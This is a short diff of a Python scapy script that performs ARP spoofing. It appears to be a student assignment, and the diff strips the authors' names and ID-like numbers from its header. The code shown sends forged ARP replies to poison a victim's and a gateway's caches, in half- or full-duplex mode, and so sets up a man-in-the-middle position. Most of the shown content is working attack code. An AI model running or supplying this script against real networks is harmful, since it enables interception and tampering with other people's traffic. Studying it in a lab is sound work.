@@ -1,7 +1,3 @@
-#Zahava Brown - 557029367
-#Tali Cohen - 329651871
-
-
 import time
 import argparse
 from scapy.all import * 
@@ -24,7 +20,7 @@ def arpSpoof(victimIP, victimMAC, sourceIP, sourceMAC, flag, delay):
         send(scapy.all.ARP(op=2, pdst=victimIP, psrc=sourceIP, hwdst=victimMAC), verbose=0) # me -> victim
                                                                             # we are telling victim that our mac is associated with source ip (often gateway)
         if flag: # continue with full duplex
-            send(scapy.all.ARP(op=2, pdst=sourceIP, psrc=victimIP, hwdst=sourceMAC, hwsrc='08:00:27:b1:9d:67'), verbose = 0) #victim-> me
+            send(scapy.all.ARP(op=2, pdst=sourceIP, psrc=victimIP, hwdst=sourceMAC), verbose = 0) #victim-> me
                                                                             # pretending to source ip that we are the victim, our mac connects to victim ip
         else: # continue with half duplex
             send(scapy.all.ARP(op=2, pdst=sourceIP, psrc=victimIP, hwdst=sourceMAC, hwsrc=victimMAC), verbose = 0) # ensuring the source knows the victim ip and mac
